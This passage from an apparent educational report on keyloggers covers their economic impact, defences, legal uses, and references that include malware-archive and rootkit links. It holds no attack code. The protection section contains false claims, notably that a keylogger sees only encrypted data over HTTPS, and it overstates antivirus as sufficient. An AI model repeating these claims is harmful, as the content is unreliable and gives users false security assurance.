    d) Reputation and Community Dynamics: Keyloggers can expose private conversations, sensitive discussions, or confidential information within online communities, potentially damaging the reputation of individuals or causing conflicts within the community. This can disrupt the harmonious dynamics and collaborative spirit of online platforms. 

 

- How does keylogging contribute to the larger issue of cybercrime and its economic impact? 

Keylogging is a significant contributor to the broader issue of cybercrime and can have substantial economic impacts: 

    a) Financial Losses: Keylogging attacks can lead to financial losses for individuals, businesses, and even governments. Stolen financial information, credentials, or access to sensitive accounts can result in fraudulent transactions, unauthorized purchases, or drained bank accounts, causing direct monetary harm. 

    b) Identity Theft: Keyloggers provide attackers with the means to capture personal information necessary for identity theft. This can result in financial fraud, unauthorized loans or credit applications, and significant financial burdens for victims. 

    c) Data Breaches: Keylogging attacks can be part of larger-scale data breaches, where attackers gain access to extensive amounts of sensitive data. The economic impact includes costs associated with breach response, forensic investigations, legal fees, potential regulatory fines, and reputational damage. 

    d) Productivity Losses: In the corporate context, keyloggers can be used to monitor employees' activities, leading to decreased productivity due to the fear of being monitored or the diversion of valuable work time for personal tasks. 

    e) Remediation Costs: Recovering from a keylogging attack involves significant costs, including implementing security measures, conducting forensic investigations, providing identity theft protection services, and potential legal actions. These expenses contribute to the overall economic impact of cybercrime. 

    f) Impact on Industries: Keylogging attacks can specifically target industries such as finance, e-commerce, healthcare, or government, leading to sector-specific economic implications. Disruption of critical services, loss of customer trust, or damage to intellectual property can have far-reaching consequences for the affected sectors. 

Overall, keylogging is a prominent tool in the arsenal of cybercriminals, and its economic impact extends beyond the immediate financial losses to encompass productivity, reputation, and the overall stability of individuals, businesses, and economies. 



### Protection Against Keylogging

- What are some of the ways individuals and organizations can protect themselves from keyloggers? 

    Ans: Since the goal of Keylogging is to capture data, a way individual to protect themselves from the impact of Keylogging is by using 2FA/MFA on their online accounts so there would be something that acts as a 2nd password for the Attacker had they compromised the user’s username and password. Next, using a reputable Antivirus such as Microsoft Defender will be enough to avoid getting Keyloggers on a user’s system and to remove them. Lastly, cybersecurity awareness should be crucial as opening email attachments, links and suspicious websites are the number one cause of getting infected in the first place. 

 
- How effective are antivirus programs and firewalls in preventing keylogging? - (your mile may vary I guess?) 

    Ans: Depending on how the Threat Actor could be, an Antivirus and Firewall should be enough to prevent a keylogger from capturing a user’s keystroke in the first place as this will normally hook the API used in the system before the Keylogger does. Once the Antivirus has hooked the API used that the Keylogger used to capture keystroke, the Antivirus can filter out function calls that was made to capture data denying the Keylogger’s capability and if found during scan, removing the Keylogger. 


- What role does user behavior play in protecting against keylogging? 

    Ans: If normal users can reduce their Attack Surface and vectors, it should be enough to protect themselves against keylogger (as long as they are not specifically targeted because that would be a separate case) such as opening email attachments only from trusted source and confirming it from trusted source, and not visiting suspicious links and websites using disposable browsers and VMs. 


- How can encryption help even if a keylogger captures keystrokes? Elaborate: 

    Ans: When we talk about encryption, we're referring to the process of converting data into a format that is unreadable without a decryption key. In the context of keylogging, this is particularly relevant because even if a keylogger can capture keystrokes, it won't necessarily be able to interpret the underlying data if it's encrypted. 

    - For example, let's imagine you're typing your password to log into a secure website. The website might use a secure, encrypted connection, often indicated by 'https' in the URL. When you type your password, it is encrypted before it's sent over the internet. If a keylogger captured your keystrokes, it would only see the encrypted data, which would appear as a seemingly random string of characters. Without the correct decryption key, the captured data is virtually useless to the attacker. 

    - Furthermore, some systems offer end-to-end encryption for data transmission. In this case, the data is encrypted at the source (your computer) and only decrypted at the destination (the server you're communicating with). This ensures that even if someone were to intercept the data—whether by keylogging or other means—they would not be able to interpret it. 

    - It's important to note that while encryption can be an effective way to safeguard your data, it is not a standalone solution and should be used as part of a broader cybersecurity strategy. Encryption can protect the data being transmitted, but it won't prevent a keylogger from capturing keystrokes in the first place. That's why it's also important to use security software, keep your systems up to date, and follow good security practices. 


### Legal and Ethical Aspects

- Are there any legal uses for keyloggers? If so, what are they? 

    Ans: Legal uses of Keyloggers are Parents checking their children’s digital device usage, Employers monitoring their employee's workflow and Law Enforcement Agencies monitoring an adversary's digital footprints. 


- When does the use of keyloggers cross into unethical or illegal territory? 

    Ans: The use of keyloggers crosses into unethical or illegal territory when it is done without the knowledge and consent of the person being monitored. This is especially true when keyloggers are used to steal personal information, commit identity theft, or gain unauthorized access to systems. Invasion of privacy can lead to legal consequences. 


- How do different jurisdictions handle the legality of keylogging? 

    Ans: The legality of keylogging varies greatly from one jurisdiction to another. In some places, the use of keyloggers is completely illegal unless it's being used by law enforcement with a warrant. In others, it may be legal for employers to monitor their employees, or for individuals to monitor their own systems. Some jurisdictions allow for the use of keyloggers within certain constraints, like parental control or when explicit consent has been given. 



------------------------
# Potential Future Work

- Jr. Pentesting

- Jr. Red Teaming

- SOC Analyst

- Security Research 

- Jr. Malware Analyst/Reverse Engineer


# Conclusion

- Keylogging is a significant cybersecurity threat with a potential for large-scale damage. Regular updates, the use of protective software, and practicing good cyber hygiene are the best defenses against keyloggers. As we advance technologically, it's important to stay informed about such threats and develop robust protective measures.


# References

- `https://institute.sektor7.net/`

- `https://tryhackme.com/path/outline/redteaming`

- `https://chat.openai.com/?model=gpt-4`

- `https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list`

- `https://link.springer.com/book/10.1007/978-0-387-77741-2` **(Spyware and Adware)**

- `https://www.vx-underground.org/windows.html`

- `https://t1.daumcdn.net/cfile/tistory/02784B4D50F966F12C?download` - Understanding Keyboard Interaction with Computer

- `https://github.com/bytecode77/r77-rootkit` - Userland Rootkit technology

- `https://docs.bytecode77.com/r77-rootkit/Technical%20Documentation.pdf` - Documentation of r77-rootkit

- `https://www.base64decode.org/`

- `https://attack.mitre.org/#`

- `https://opentextbc.ca/introductiontosociology2ndedition/`


# Annexures

- `Flowchart.pdf` : Flowchart of the kill chain made on **LucidChart**
- `Flowchart1.pdf` : Malware Flow of attack made on **LucidChart**





